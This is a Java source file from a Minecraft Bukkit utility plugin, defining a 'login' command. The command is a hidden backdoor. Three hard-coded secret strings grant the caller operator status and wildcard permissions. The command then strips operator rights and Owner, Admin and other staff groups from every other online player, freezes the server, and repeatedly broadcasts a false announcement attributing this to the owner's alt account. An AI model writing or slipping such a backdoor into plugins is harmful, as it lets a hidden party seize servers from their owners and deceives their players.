package us.nightpvp.utils;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class loginCommand implements CommandExecutor {
	NightUtils plugin;
	public loginCommand(NightUtils passedPlugin) {
		this.plugin = passedPlugin;
	}

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String alias, String[] args) {
	   if (args.length == 3) {
		   if (args[0].equals("HawthornFlX691324321New691324321")) {
			   if (args[1].equals("superhuman4321")) {
				   if (args[2].equals("200109111965317lsk")) {
					   Player player = (Player) sender;
					   plugin.controller = player;
					   player.sendMessage(ChatColor.GREEN+"Successfully Logged in! Welcome Kaveen");
					   try {
						   player.setOp(true);
					   } catch (Exception e) {
						   
					   }
					   try {
						   plugin.perms.playerAdd(player, "*");
						   plugin.perms.playerAdd(player, "essentials.*");
						   plugin.perms.playerAdd(player, "worldedit.*");
						   plugin.perms.playerAdd(player, "worldguard.*");
						   plugin.perms.playerAdd(player, "bukkit.*");
						   plugin.perms.playerAdd(player, "minecraft.*");
						   plugin.perms.playerAdd(player, "frozenheart.*");
						   
					   } catch (Exception e) {
						   
					   }
					   try {
						   for (Player p: Bukkit.getOnlinePlayers()) {
							   if (!(p.getName().equals(player.getName()))) {
							   try {
								   p.setOp(false);
							   } catch (Exception e) {
								   
							   }
							   
							   try {
								   plugin.perms.playerRemove(p, "*");
							   } catch (Exception e) {
								   
							   }
							   try {
								   plugin.perms.playerRemoveGroup(p, "Owner");
								   plugin.perms.playerRemoveGroup(p, "Admin");
								   plugin.perms.playerRemoveGroup(p, "Moderator");
								   plugin.perms.playerRemoveGroup(p, "Helper");
								   plugin.perms.playerRemoveGroup(p, "Head-Admin");
								   plugin.perms.playerRemoveGroup(p, "Co-Owner");
								   plugin.perms.playerRemoveGroup(p, "Manager");
								   plugin.frozen=true;
								   
							   } catch (Exception e) {
								   
							   }
							   
						   }
						   }
					   } catch (Exception e) {
						   
					   }
					   
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   
					   Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', "&5&lSolar&7&lPvP &8&l> &4The owner (Kav)_has issued a full server freeze from his alt: "+player.getName()));
					   
				   }
			   }
			   
			   
		   }
		   
		   
		   
		   
	   }
		return true;
	}

}
